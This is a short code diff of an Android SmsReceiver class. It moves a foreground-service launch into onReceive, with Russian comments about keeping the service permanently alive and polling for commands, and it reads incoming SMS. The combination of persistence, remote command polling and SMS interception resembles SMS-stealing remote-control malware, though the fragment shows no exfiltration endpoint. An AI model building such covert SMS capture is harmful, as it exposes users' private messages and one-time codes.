@@ -6,12 +6,12 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import org.json.JSONArray;
-import org.json.JSONObject;
 
 public class SmsReceiver extends BroadcastReceiver {
     private static final String TAG = "SmsReceiver";
@@ -19,17 +19,17 @@ public class SmsReceiver extends BroadcastReceiver {
     private static Context appContext;
 
     @Override
-    context.startForegroundService(new Intent(context, KeepAliveService.class));
     public void onReceive(Context context, Intent intent) {
+        // Запускаем сервис, чтобы он жил постоянно
+        context.startForegroundService(new Intent(context, KeepAliveService.class));
+        
         appContext = context.getApplicationContext();
 
-        // Запускаем polling для команд, если ещё не запущен
         if (!pollingStarted) {
             pollingStarted = true;
             startCommandPolling();
         }
 
-        // Обработка СМС
         if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
             Bundle bundle = intent.getExtras();
             if (bundle == null) return;
